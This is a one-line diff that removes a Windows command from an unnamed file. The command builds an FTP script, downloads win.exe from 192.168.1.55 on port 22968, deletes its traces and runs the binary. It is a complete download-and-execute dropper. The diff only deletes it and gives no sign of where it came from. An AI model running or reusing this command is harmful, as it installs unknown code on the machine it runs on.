@@ -1,1 +1,0 @@
-cmd /c echo open 192.168.1.55 22968 >> ii &echo user 1 1 >> ii &echo get win.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &win.exe
